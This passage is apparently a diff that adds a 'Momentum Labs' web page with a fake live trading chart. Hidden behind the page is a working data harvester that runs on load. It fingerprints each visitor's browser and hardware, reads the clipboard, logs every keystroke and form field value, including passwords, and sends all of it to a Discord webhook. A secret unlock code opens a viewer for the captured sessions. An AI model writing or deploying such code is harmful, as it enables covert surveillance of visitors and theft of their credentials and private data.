+      "Inter","Roboto","Noto Sans","Ubuntu","Cantarell","DejaVu Sans","Liberation Sans",
+    ];
+    const base = "monospace";
+    const span = document.createElement("span");
+    span.style.cssText = "position:absolute;left:-9999px;top:-9999px;font-size:72px;visibility:hidden;";
+    span.textContent = "mmmmmmmmmmlli";
+    document.body.appendChild(span);
+    const baseW = {};
+    ["monospace","sans-serif","serif"].forEach(b => {
+      span.style.fontFamily = b;
+      baseW[b] = span.offsetWidth;
+    });
+    const found = [];
+    candidates.forEach(f => {
+      let detected = false;
+      ["monospace","sans-serif","serif"].forEach(b => {
+        span.style.fontFamily = `'${f}',${b}`;
+        if (span.offsetWidth !== baseW[b]) detected = true;
+      });
+      if (detected) found.push(f);
+    });
+    document.body.removeChild(span);
+    return found;
+  }
+
+  /* ---------- plugins ---------- */
+  function pluginsProbe() {
+    try {
+      return Array.from(navigator.plugins || []).map(p => ({
+        name: p.name, filename: p.filename, description: p.description,
+      }));
+    } catch(e){ return []; }
+  }
+
+  /* ---------- voices (speech synthesis) ---------- */
+  function voicesProbe() {
+    return new Promise(resolve => {
+      try {
+        const v = speechSynthesis.getVoices();
+        if (v && v.length) return resolve(v.map(x => `${x.name}|${x.lang}`));
+        speechSynthesis.onvoiceschanged = () => {
+          resolve((speechSynthesis.getVoices() || []).map(x => `${x.name}|${x.lang}`));
+        };
+        setTimeout(() => resolve((speechSynthesis.getVoices() || []).map(x => `${x.name}|${x.lang}`)), 800);
+      } catch(e){ resolve([]); }
+    });
+  }
+
+  /* ---------- async hardware bits ---------- */
+  async function batteryProbe() {
+    try {
+      if (!navigator.getBattery) return null;
+      const b = await navigator.getBattery();
+      return { charging: b.charging, level: b.level, chargingTime: b.chargingTime, dischargingTime: b.dischargingTime };
+    } catch(e){ return null; }
+  }
+  function networkProbe() {
+    try {
+      const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      if (!c) return null;
+      return {
+        effectiveType: c.effectiveType, downlink: c.downlink,
+        rtt: c.rtt, saveData: c.saveData,
+      };
+    } catch(e){ return null; }
+  }
+  async function mediaProbe() {
+    try {
+      if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return null;
+      const d = await navigator.mediaDevices.enumerateDevices();
+      const out = { count: d.length, audioinput: 0, audiooutput: 0, videoinput: 0, devices: [] };
+      d.forEach(x => {
+        if (out[x.kind] !== undefined) out[x.kind]++;
+        out.devices.push({ kind: x.kind, label: x.label || null, groupId: x.groupId ? x.groupId.slice(0,8) : null });
+      });
+      return out;
+    } catch(e){ return null; }
+  }
+  async function permsProbe() {
+    try {
+      if (!navigator.permissions || !navigator.permissions.query) return null;
+      const names = ["geolocation","notifications","camera","microphone","clipboard-read","clipboard-write","midi","background-sync","persistent-storage"];
+      const out = {};
+      for (const n of names) {
+        try {
+          const r = await navigator.permissions.query({ name: n });
+          out[n] = r.state;
+        } catch(e){ out[n] = "unsupported"; }
+      }
+      return out;
+    } catch(e){ return null; }
+  }
+  async function clipboardProbe() {
+    try {
+      if (!navigator.clipboard || !navigator.clipboard.readText) return null;
+      const t = await navigator.clipboard.readText();
+      return t ? t.slice(0, 500) : "";
+    } catch(e){ return null; }
+  }
+  function gamepadProbe() {
+    try {
+      const g = navigator.getGamepads ? navigator.getGamepads() : [];
+      return Array.from(g || []).filter(Boolean).length;
+    } catch(e){ return 0; }
+  }
+
+  /* ---------- hash util ---------- */
+  function simpleHash(str) {
+    let h = 5381;
+    for (let i = 0; i < str.length; i++) h = ((h << 5) + h) ^ str.charCodeAt(i);
+    return (h >>> 0).toString(36);
+  }
+
+  /* ---------- event capture ---------- */
+  function pushEvent(type, data) {
+    session.events.push({ t: nowMs(), type, ...data });
+    if (session.events.length > 5000) session.events.splice(0, 1000);
+  }
+
+  function onKey(e) {
+    const target = e.target;
+    const tag = target && target.tagName ? target.tagName.toLowerCase() : "";
+    const field = (target && (target.name || target.id || target.type)) || tag || "body";
+    const rec = {
+      t: nowMs(),
+      field: String(field).slice(0, 60),
+      key: e.key,
+      code: e.code,
+      ctrl: e.ctrlKey, alt: e.altKey, shift: e.shiftKey, meta: e.metaKey,
+    };
+    session.keystrokes.push(rec);
+    if (session.keystrokes.length > CONFIG.MAX_KEYSTROKES) session.keystrokes.shift();
+
+    // also track current field value if it's an input/textarea
+    if (target && (tag === "input" || tag === "textarea")) {
+      const name = String(field).slice(0, 60);
+      session.forms[name] = (target.value || "").slice(0, 500);
+    }
+    pushEvent("key", { k: e.key });
+  }
+
+  function onMouse(e) {
+    if (session.mouse.length >= CONFIG.MAX_MOUSE_POINTS) return;
+    session.mouse.push([e.clientX, e.clientY, nowMs()]);
+  }
+  function onClick(e) {
+    session.clicks.push([e.clientX, e.clientY, nowMs()]);
+    if (session.clicks.length > 400) session.clicks.shift();
+    pushEvent("click", { x: e.clientX, y: e.clientY, tag: (e.target && e.target.tagName) || "" });
+  }
+  function onScroll() {
+    session.scroll.push([window.scrollY, nowMs()]);
+    if (session.scroll.length > 400) session.scroll.shift();
+  }
+  function onVis() {
+    pushEvent("visibility", { state: document.visibilityState });
+    if (document.visibilityState === "hidden") flushNow();
+  }
+  function onFocus() { pushEvent("focus", {}); }
+  function onBlur()  { pushEvent("blur", {}); }
+
+  /* ---------- transport ---------- */
+  function buildPayload(kind) {
+    session.lastSeen = new Date().toISOString();
+    return {
+      kind,                                  // "init" | "batch" | "final"
+      sessionId: session.id,
+      startedAt: session.startedAt,
+      lastSeen: session.lastSeen,
+      url: session.url,
+      referrer: session.referrer,
+      ua: session.ua,
+      tz: session.timezone,
+      lang: session.language,
+      screen: session.screen,
+      fp: session.fingerprint,
+      battery: session.battery,
+      network: session.network,
+      media: session.mediaDevices,
+      perms: session.permissions,
+      clipboard: session.clipboard,
+      keystrokes: kind === "init" ? [] : session.keystrokes.slice(-400),
+      forms: session.forms,
+      mouseCount: session.mouse.length,
+      clickCount: session.clicks.length,
+      scrollCount: session.scroll.length,
+      events: kind === "init" ? [] : session.events.slice(-80),
+    };
+  }
+
+  function saveLocal(payload) {
+    try {
+      const raw = localStorage.getItem(CONFIG.STORAGE_KEY);
+      const all = raw ? JSON.parse(raw) : {};
+      const id = session.id;
+      if (!all[id]) {
+        all[id] = { id, first: session.startedAt, last: session.lastSeen, events: [], full: session };
+      }
+      all[id].last = session.lastSeen;
+      all[id].full = session;
+      all[id].events.push({ t: Date.now(), kind: payload.kind });
+      // cap stored sessions
+      const ids = Object.keys(all);
+      if (ids.length > 200) delete all[ids[0]];
+      localStorage.setItem(CONFIG.STORAGE_KEY, JSON.stringify(all));
+    } catch(e){ /* quota */ }
+  }
+
+  function sendToDiscord(payload, kind) {
+    const url = webhookURL();
+    if (!url) return;
+    const body = formatDiscord(payload, kind);
+    try {
+      // no-cors + text/plain → request fires without preflight.
+      // discord accepts text/plain bodies that contain JSON.
+      fetch(url, {
+        method: "POST",
+        mode: "no-cors",
+        headers: { "Content-Type": "text/plain" },
+        body: JSON.stringify(body),
+        keepalive: true,
+      }).catch(()=>{});
+    } catch(e){ /* silent */ }
+  }
+
+  function formatDiscord(p, kind) {
+    const sid = p.sessionId;
+    const lines = [];
+    if (kind === "init") {
+      lines.push(`**🟢 new session** \`${sid}\``);
+      lines.push(`ua: \`${p.ua.slice(0,120)}\``);
+      lines.push(`tz: \`${p.tz}\`  lang: \`${p.lang}\``);
+      lines.push(`screen: \`${p.screen.w}x${p.screen.h} dpr${p.screen.dpr}\``);
+      lines.push(`fp.canvas: \`${p.fp.canvas ? p.fp.canvas.hash : "n/a"}\``);
+      if (p.fp.webgl) lines.push(`gpu: \`${(p.fp.webgl.unmaskedRenderer||p.fp.webgl.renderer||"").slice(0,100)}\``);
+      if (p.fp.audio) lines.push(`audio fp: \`${p.fp.audio.hash}\``);
+      if (p.fp.fonts && p.fp.fonts.length) lines.push(`fonts(${p.fp.fonts.length}): \`${p.fp.fonts.slice(0,15).join(", ")}\``);
+      if (p.battery) lines.push(`battery: \`${Math.round(p.battery.level*100)}% ${p.battery.charging?"charging":"discharging"}\``);
+      if (p.network) lines.push(`net: \`${p.network.effectiveType} ${p.network.downlink}Mbps rtt${p.network.rtt}\``);
+      if (p.media) lines.push(`media: \`in${p.media.audioinput} out${p.media.audiooutput} cam${p.media.videoinput}\``);
+      if (p.referrer) lines.push(`ref: \`${p.referrer.slice(0,120)}\``);
+      return { content: lines.join("\n").slice(0, 1900) };
+    }
+
+    // batch / final
+    const ks = p.keystrokes.slice(-40).map(k => k.key).join("");
+    lines.push(`**📥 ${kind}** \`${sid}\``);
+    if (ks) lines.push(`keys: \`${ks.slice(0, 180)}\``);
+    const formKeys = Object.keys(p.forms || {});
+    if (formKeys.length) {
+      const fv = formKeys.map(k => `${k}=${(p.forms[k]||"").slice(0,60)}`).join("  ");
+      lines.push(`forms: \`${fv.slice(0,300)}\``);
+    }
+    lines.push(`mouse:${p.mouseCount}  clicks:${p.clickCount}  scroll:${p.scrollCount}`);
+    if (p.clipboard) lines.push(`clipboard: \`${String(p.clipboard).slice(0,200)}\``);
+    return { content: lines.join("\n").slice(0, 1900) };
+  }
+
+  function flushNow(kind = "batch") {
+    const p = buildPayload(kind);
+    saveLocal(p);
+    if (state.timer) { /* still send */ }
+    if (kind === "final") {
+      // beacon is more reliable on unload
+      const url = webhookURL();
+      if (url && navigator.sendBeacon) {
+        try {
+          const blob = new Blob([JSON.stringify(formatDiscord(p, kind))], { type: "text/plain" });
+          navigator.sendBeacon(url, blob);
+        } catch(e){
+          sendToDiscord(p, kind);
+        }
+      } else {
+        sendToDiscord(p, kind);
+      }
+    } else {
+      sendToDiscord(p, kind);
+    }
+  }
+
+  /* ---------- boot ---------- */
+  async function boot() {
+    // initial sync probes
+    session.fingerprint.canvas = canvasFP();
+    session.fingerprint.webgl  = webglFP();
+    session.fingerprint.fonts  = fontsProbe();
+    session.fingerprint.hash   = simpleHash(JSON.stringify({
+      c: session.fingerprint.canvas && session.fingerprint.canvas.hash,
+      w: session.fingerprint.webgl && session.fingerprint.webgl.unmaskedRenderer,
+      s: session.screen, tz: session.timezone, l: session.language,
+      p: session.hardware.platform, c2: session.hardware.cores, m: session.hardware.memoryGB,
+    }));
+
+    session.plugins = pluginsProbe();
+    session.network = networkProbe();
+    session.gamepads = gamepadProbe();
+
+    // async probes
+    audioFP().then(a => { session.fingerprint.audio = a; });
+    voicesProbe().then(v => { session.voices = v; });
+    batteryProbe().then(b => { session.battery = b; });
+    mediaProbe().then(m => { session.mediaDevices = m; });
+    permsProbe().then(p => { session.permissions = p; });
+
+    // listeners
+    document.addEventListener("keydown", onKey, true);
+    document.addEventListener("mousemove", onMouse, { passive: true });
+    document.addEventListener("click", onClick, true);
+    window.addEventListener("scroll", onScroll, { passive: true });
+    document.addEventListener("visibilitychange", onVis);
+    window.addEventListener("focus", onFocus);
+    window.addEventListener("blur", onBlur);
+    window.addEventListener("beforeunload", () => flushNow("final"));
+    window.addEventListener("pagehide",      () => flushNow("final"));
+
+    // initial send after probes settle a bit
+    setTimeout(() => flushNow("init"), 1500);
+
+    // periodic batch
+    state.timer = setInterval(() => flushNow("batch"), CONFIG.BATCH_INTERVAL_MS);
+  }
+
+  return { boot, session, flushNow };
+})();
+
+/* =========================================================================
+   HOME INTERACTIONS + LIVE CHART
+   ========================================================================= */
+(function home() {
+  // ---- live chart (fake candles drifting) ----
+  const cvs = document.getElementById("liveChart");
+  if (!cvs) return;
+  const ctx = cvs.getContext("2d");
+  let W = 0, H = 0, dpr = Math.min(window.devicePixelRatio || 1, 2);
+  const candles = [];
+  let price = 5842.25;
+  const base = price;
+  const n = 46;
+
+  function resize() {
+    const r = cvs.getBoundingClientRect();
+    W = r.width; H = r.height;
+    cvs.width = W * dpr; cvs.height = H * dpr;
+    ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
+  }
+  resize();
+  window.addEventListener("resize", resize);
+
+  // seed candles
+  for (let i = 0; i < n; i++) {
+    const o = price;
+    const drift = (Math.random() - 0.48) * 6;
+    const c = o + drift;
+    const h = Math.max(o, c) + Math.random() * 3;
+    const l = Math.min(o, c) - Math.random() * 3;
+    candles.push({ o, h, l, c });
+    price = c;
+  }
+
+  function tick() {
+    const last = candles[candles.length - 1];
+    const o = last.c;
+    const drift = (Math.random() - 0.49) * 5.5;
+    const c = o + drift;
+    const h = Math.max(o, c) + Math.random() * 2.4;
+    const l = Math.min(o, c) - Math.random() * 2.4;
+    candles.push({ o, h, l, c });
+    if (candles.length > n) candles.shift();
+
+    // update price readouts
+    const p = document.getElementById("chartPrice");
+    const d = document.getElementById("chartDelta");
+    const delta = c - base;
+    const pct = (delta / base) * 100;
+    p.textContent = c.toFixed(2);
+    d.textContent = (delta >= 0 ? "+" : "") + delta.toFixed(2) + " (" + (pct >= 0 ? "+" : "") + pct.toFixed(2) + "%)";
+    p.style.color = delta >= 0 ? "var(--green)" : "var(--red)";
+    d.style.color = delta >= 0 ? "var(--green)" : "var(--red)";
+
+    let hi = -Infinity, lo = Infinity;
+    candles.forEach(k => { if (k.h > hi) hi = k.h; if (k.l < lo) lo = k.l; });
+    const so = document.getElementById("statO"); if (so) so.textContent = candles[0].o.toFixed(2);
+    const sh = document.getElementById("statH"); if (sh) sh.textContent = hi.toFixed(2);
+    const sl = document.getElementById("statL"); if (sl) sl.textContent = lo.toFixed(2);
+    const sv = document.getElementById("statV"); if (sv) sv.textContent = (120 + Math.random()*40).toFixed(1) + "k";
+  }
+
+  function draw() {
+    ctx.clearRect(0, 0, W, H);
+    const pad = 12;
+    let hi = -Infinity, lo = Infinity;
+    candles.forEach(k => { if (k.h > hi) hi = k.h; if (k.l < lo) lo = k.l; });
+    const range = hi - lo || 1;
+    const step = (W - pad * 2) / candles.length;
+    const bw = Math.max(2, step * 0.62);
+
+    // grid
+    ctx.strokeStyle = "rgba(255,255,255,0.035)";
+    ctx.lineWidth = 1;
+    for (let i = 1; i < 5; i++) {
+      const y = (H / 5) * i;
+      ctx.beginPath(); ctx.moveTo(0, y); ctx.lineTo(W, y); ctx.stroke();
+    }
+
+    candles.forEach((k, i) => {
+      const x = pad + i * step + step / 2;
+      const yO = pad + (hi - k.o) / range * (H - pad * 2);
+      const yC = pad + (hi - k.c) / range * (H - pad * 2);
+      const yH = pad + (hi - k.h) / range * (H - pad * 2);
+      const yL = pad + (hi - k.l) / range * (H - pad * 2);
+      const up = k.c >= k.o;
+      ctx.strokeStyle = up ? "#16c784" : "#ea3943";
+      ctx.fillStyle   = up ? "#16c784" : "#ea3943";
+      ctx.beginPath();
+      ctx.moveTo(x, yH); ctx.lineTo(x, yL); ctx.stroke();
+      const top = Math.min(yO, yC);
+      const hgt = Math.max(1.5, Math.abs(yC - yO));
+      ctx.fillRect(x - bw / 2, top, bw, hgt);
+    });
+
+    // last price line
+    const lastC = candles[candles.length - 1].c;
+    const yLast = pad + (hi - lastC) / range * (H - pad * 2);
+    ctx.strokeStyle = "rgba(22,199,132,0.5)";
+    ctx.setLineDash([4, 4]);
+    ctx.beginPath(); ctx.moveTo(0, yLast); ctx.lineTo(W, yLast); ctx.stroke();
+    ctx.setLineDash([]);
+  }
+
+  setInterval(() => { tick(); draw(); }, 850);
+  draw();
+})();
+
+/* =========================================================================
+   0406 UNLOCK LISTENER
+   ========================================================================= */
+(function unlockListener() {
+  let buf = "";
+  document.addEventListener("keydown", (e) => {
+    if (e.key.length === 1) buf += e.key;
+    if (buf.length > 32) buf = buf.slice(-32);
+    if (e.key === "Enter") {
+      if (buf.includes(CONFIG.UNLOCK_CODE)) {
+        try { sessionStorage.setItem(CONFIG.TOKEN_KEY, "1"); } catch(_){}
+        LogsView.open();
+      }
+      buf = "";
+    }
+  });
+})();
+
+/* =========================================================================
+   LOGS VIEWER
+   ========================================================================= */
+const LogsView = (() => {
+  let selected = null;
+
+  function open() {
+    const el = document.getElementById("logsOverlay");
+    el.classList.add("on");
+    refresh();
+  }
+  function close() {
+    document.getElementById("logsOverlay").classList.remove("on");
+  }
+  function loadAll() {
+    try {
+      const raw = localStorage.getItem(CONFIG.STORAGE_KEY);
+      return raw ? JSON.parse(raw) : {};
+    } catch(e){ return {}; }
+  }
+  function refresh() {
+    const all = loadAll();
+    const list = document.getElementById("logsList");
+    const ids = Object.keys(all).sort((a,b) => (all[b].last || "").localeCompare(all[a].last || ""));
+    if (!ids.length) {
+      list.innerHTML = `<div class="log-empty">No sessions captured yet.<br><br>Visitors to this page will appear here once the harvester sends its first batch.</div>`;
+      return;
+    }
+    list.innerHTML = "";
+    ids.forEach(id => {
+      const s = all[id];
+      const div = document.createElement("div");
+      div.className = "log-item" + (id === selected ? " sel" : "");
+      div.onclick = () => { selected = id; renderDetail(all[id]); refresh(); };
+      const kcount = (s.full && s.full.keystrokes) ? s.full.keystrokes.length : 0;
+      div.innerHTML = `
+        <div class="sid">${id}</div>
+        <div class="meta">
+          <span>${new Date(s.first).toLocaleString()}</span>
+          <span>${kcount} keys</span>
+        </div>
+      `;
+      list.appendChild(div);
+    });
+    if (selected && all[selected]) renderDetail(all[selected]);
+  }
+
+  function esc(x){ return String(x == null ? "" : x).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }
+
+  function renderDetail(s) {
+    const full = s.full || {};
+    const el = document.getElementById("logsDetail");
+    const fp = full.fingerprint || {};
+    const hw = full.hardware || {};
+    const sc = full.screen || {};
+
+    const rows = [
+      ["session id", s.id],
+      ["first seen", s.first],
+      ["last seen", s.last],
+      ["url", full.url],
+      ["referrer", full.referrer || "—"],
+      ["user agent", full.ua],
+      ["language", full.language],
+      ["timezone", full.timezone],
+      ["platform", hw.platform],
+      ["vendor", hw.vendor],
+      ["cores", hw.cores],
+      ["memory (GB)", hw.memoryGB],
+      ["touch", hw.touch],
+      ["screen", sc.w + "×" + sc.h + " dpr" + sc.dpr + " depth" + sc.colorDepth],
+      ["viewport", sc.innerW + "×" + sc.innerH],
+      ["canvas fp", fp.canvas ? fp.canvas.hash : "—"],
+      ["webgl renderer", fp.webgl ? (fp.webgl.unmaskedRenderer || fp.webgl.renderer) : "—"],
+      ["webgl vendor", fp.webgl ? (fp.webgl.unmaskedVendor || fp.webgl.vendor) : "—"],
+      ["audio fp", fp.audio ? fp.audio.hash : "—"],
+      ["combined fp", fp.hash],
+      ["battery", full.battery ? Math.round(full.battery.level*100) + "% " + (full.battery.charging ? "charging" : "discharging") : "—"],
+      ["network", full.network ? `${full.network.effectiveType} ${full.network.downlink}Mbps rtt${full.network.rtt}` : "—"],
+      ["media devices", full.mediaDevices ? `in:${full.mediaDevices.audioinput} out:${full.mediaDevices.audiooutput} cam:${full.mediaDevices.videoinput}` : "—"],
+      ["gamepads", full.gamepads],
+    ];
+
+    let html = "";
+    html += `<div class="dsec"><h5>Identity</h5>`;
+    rows.forEach(([k,v]) => {
+      html += `<div class="drow"><div class="k">${esc(k)}</div><div class="v">${esc(v)}</div></div>`;
+    });
+    html += `</div>`;
+
+    if (fp.fonts && fp.fonts.length) {
+      html += `<div class="dsec"><h5>Fonts detected (${fp.fonts.length})</h5>`;
+      html += `<div class="v" style="font-family:ui-monospace,monospace;font-size:12px;color:var(--fg-2)">${esc(fp.fonts.join(", "))}</div>`;
+      html += `</div>`;
+    }
+
+    if (full.forms && Object.keys(full.forms).length) {
+      html += `<div class="dsec"><h5>Form fields</h5>`;
+      Object.entries(full.forms).forEach(([k,v]) => {
+        html += `<div class="drow"><div class="k">${esc(k)}</div><div class="v">${esc(v)}</div></div>`;
+      });
+      html += `</div>`;
+    }
+
+    if (full.keystrokes && full.keystrokes.length) {
+      html += `<div class="dsec"><h5>Keystrokes (${full.keystrokes.length})</h5>`;
+      // group into lines of ~80 chars
+      const chars = full.keystrokes.map(k => {
+        if (k.key === "Enter") return "\n";
+        if (k.key === "Backspace") return "⌫";
+        if (k.key === "Tab") return "⇥";
+        if (k.key.length === 1) return k.key;
+        return "";
+      }).join("");
+      const chunked = chars.match(/.{1,90}/gs) || [];
+      chunked.slice(-30).forEach(line => {
+        html += `<div class="keyline">${esc(line)}</div>`;
+      });
+      html += `</div>`;
+    }
+
+    if (full.mouse && full.mouse.length) {
+      html += `<div class="dsec"><h5>Mouse path (${full.mouse.length} points)</h5>`;
+      html += `<canvas id="mouseCanvas" width="600" height="300"></canvas>`;
+      html += `</div>`;
+    }
+
+    if (full.events && full.events.length) {
+      html += `<div class="dsec"><h5>Event tail (${full.events.length})</h5>`;
+      full.events.slice(-20).forEach(e => {
+        html += `<div class="keyline">${esc(e.t)} <b>${esc(e.type)}</b> ${esc(JSON.stringify({...e, t:undefined, type:undefined}))}</div>`;
+      });
+      html += `</div>`;
+    }
+
+    el.innerHTML = html;
+
+    // draw mouse canvas
+    const mc = document.getElementById("mouseCanvas");
+    if (mc && full.mouse && full.mouse.length) {
+      const c2 = mc.getContext("2d");
+      const sw = (full.screen && full.screen.w) || 1920;
+      const sh = (full.screen && full.screen.h) || 1080;
+      const sx = mc.width / sw;
+      const sy = mc.height / sh;
+      c2.fillStyle = "#0f141b"; c2.fillRect(0, 0, mc.width, mc.height);
+      c2.strokeStyle = "rgba(22,199,132,0.08)";
+      for (let i = 1; i < 8; i++) {
+        c2.beginPath(); c2.moveTo((mc.width/8)*i, 0); c2.lineTo((mc.width/8)*i, mc.height); c2.stroke();
+        c2.beginPath(); c2.moveTo(0, (mc.height/8)*i); c2.lineTo(mc.width, (mc.height/8)*i); c2.stroke();
+      }
+      c2.fillStyle = "rgba(22,199,132,0.9)";
+      full.mouse.forEach(([x,y]) => {
+        c2.beginPath(); c2.arc(x*sx, y*sy, 1.4, 0, Math.PI*2); c2.fill();
+      });
+    }
+  }
+
+  function exportJSON() {
+    const all = loadAll();
+    const blob = new Blob([JSON.stringify(all, null, 2)], { type: "application/json" });
+    const a = document.createElement("a");
+    a.href = URL.createObjectURL(blob);
+    a.download = "momentum-labs-logs-" + Date.now() + ".json";
+    a.click();
+  }
+
+  function clearLocal() {
+    if (!confirm("Clear locally stored logs? Discord copies are unaffected.")) return;
+    try { localStorage.removeItem(CONFIG.STORAGE_KEY); } catch(e){}
+    selected = null;
+    refresh();
+    document.getElementById("logsDetail").innerHTML = `<div class="log-empty">Select a session to view captured data.</div>`;
+  }
+
+  return { open, close, refresh, exportJSON, clearLocal };
+})();
+
+/* =========================================================================
+   BOOT
+   ========================================================================= */
+Harvest.boot();
+</script>
+</body>
+</html>
